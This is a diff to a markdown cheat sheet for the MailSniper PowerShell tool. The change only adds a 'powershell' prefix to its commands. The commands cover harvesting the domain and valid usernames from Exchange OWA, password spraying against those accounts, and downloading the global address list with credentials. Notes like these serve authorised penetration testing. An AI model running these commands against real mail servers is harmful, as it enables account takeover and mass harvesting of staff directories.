@@ -15,7 +15,7 @@ ipmo C:\Tools\MailSniper\MailSniper.ps1
 Enumerates NetBIOS name.
 
 ``` powershell
-Invoke-DomainHarvestOWA -ExchHostname <domain>
+powershell Invoke-DomainHarvestOWA -ExchHostname <domain>
 ```
 
 ### Invoke-UsernameHarvestOWA
@@ -23,7 +23,7 @@ Invoke-DomainHarvestOWA -ExchHostname <domain>
 Validates valid usernames.
 
 ``` powershell
-Invoke-UsernameHarvestOWA -ExchHostname <exchange_hostname> -Domain <domain> -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
+powershell Invoke-UsernameHarvestOWA -ExchHostname <exchange_hostname> -Domain <domain> -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
 ```
 
 ### Invoke-PasswordSprayOWA
@@ -31,7 +31,7 @@ Invoke-UsernameHarvestOWA -ExchHostname <exchange_hostname> -Domain <domain> -Us
 Spray passwords against the valid accounts using Outlook Web Access (OWA), Exchange Web Services (EWS) and Exchange ActiveSync (EAS)
 
 ``` powershell
-Invoke-PasswordSprayOWA -ExchHostname <exchange_hostname> -UserList .\Desktop\valid.txt -Password <password>
+powershell Invoke-PasswordSprayOWA -ExchHostname <exchange_hostname> -UserList .\Desktop\valid.txt -Password <password>
 ```
 
 ### Get-GlobalAddressList
@@ -39,5 +39,5 @@ Invoke-PasswordSprayOWA -ExchHostname <exchange_hostname> -UserList .\Desktop\va
 Download the global address list with valid credentials
 
 ``` powershell
-Get-GlobalAddressList -ExchHostname <exchange_hostname> -UserName <domain>\<username> -Password <password> -OutFile .\Desktop\gal.txt
+powershell Get-GlobalAddressList -ExchHostname <exchange_hostname> -UserName <domain>\<username> -Password <password> -OutFile .\Desktop\gal.txt
 ```
